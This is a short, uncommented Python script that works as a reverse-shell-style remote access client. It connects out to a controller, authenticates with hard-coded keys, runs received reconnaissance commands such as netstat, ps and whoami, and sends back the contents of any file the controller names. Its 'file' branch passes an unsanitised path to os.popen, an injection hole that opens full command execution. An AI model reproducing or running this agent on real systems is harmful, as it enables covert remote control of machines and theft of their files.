import socket
import os
import random
import shlex

host = '0.0.0.0'
port = 8080
keys = ['secretkey1', 'secretkey2', 'secretkey3']  

def cli():
    s_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s_client.connect((host, port))
        random_key = random.choice(keys)
        s_client.sendall(random_key.encode())  
        auth_response = s_client.recv(1024).decode()
        if auth_response != 'Authentication successful':
            s_client.close()
            return

        while True:
            cmd = s_client.recv(1024).decode()
            if cmd.lower() == 'exit':
                break
            elif cmd.lower() in ['ls', 'netstat', 'ifconfig', 'ps', 'df', 'whoami','pwd']:
                try:
                    cmd = shlex.quote(cmd)
                    shell = os.popen(cmd).read()
                    s_client.sendall(shell.encode())
                except Exception as e:
                    s_client.sendall(str(e).encode())
            elif cmd.lower().startswith('cat '):
                try:
                    file_path = cmd[4:]  
                    with open(file_path, 'r') as file:
                        file_contents = file.read()
                    s_client.sendall(file_contents.encode())
                except FileNotFoundError:
                    s_client.sendall("File not found".encode())
                except Exception as e:
                    s_client.sendall(str(e).encode())
            elif cmd.lower().startswith('file '):
                try:
                    file_path = cmd[5:]
                    file_info = os.popen(f'file {file_path}').read()
                    s_client.sendall(file_info.encode())
                except FileNotFoundError:
                    s_client.sendall("File not found".encode())
                except Exception as e:
                    s_client.sendall(str(e).encode())
            else:
                s_client.sendall("Invalid command".encode())
    except Exception as e:
        print(f'Error {e}')
    finally:
        s_client.close()

cli()
